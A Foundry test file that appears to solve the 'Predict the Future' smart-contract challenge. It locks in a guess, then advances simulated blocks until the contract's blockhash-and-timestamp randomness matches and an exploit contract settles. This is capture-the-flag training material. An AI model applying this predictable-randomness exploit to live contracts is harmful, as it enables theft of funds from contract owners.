// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        console.log(
            "Begin: block.number:",block.number,
            "block.timestamp:",
            block.timestamp
        );

        // Put your solution here
        /**
         * 1.The attacker call the lockInGuess, set one number which is belong to the [0,9]
         * 2.Wait the right  block.timestamp and block.number to make the predictTheFuture's answer equal the setted number
           3.Call the settle while the right time appears
         */
        vm.deal(address(exploitContract), 1 ether); 
        uint8 guessNumber = 8; // This is can be assigned to anyone number belong to the [0,9]
        exploitContract.setGuess(guessNumber);

        // The attacker based on the current block number and block block.timestamp according to the predictTheFuture's logic brutely to wait the  answer equal the guess
        uint8 answer;
        while (guessNumber != answer) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12);
            answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
            
        }
       console.log("calculate the answer:",uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10);
       console.log(
            "Wait: the right time. block.number:",block.number,
            "block.timestamp:",
            block.timestamp
        );

        exploitContract.exploit();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}



    // reference:https://github.com/RareSkills/Udemy-Yul-Code/blob/main/Video-05-Storage-2.sol
    // get the guess number in slot0, because address is 160bits, so the slot0 should right shift 160 bits
    function getPackedValueInSlot() internal returns (uint8 guess) {
        bytes32 slotOvalue = vm.load(address(predictTheFuture), bytes32(uint256(0)));
        assembly {
            let shifted := shr(160, slotOvalue)
            guess := and(0xff, shifted)
        }
    }
}
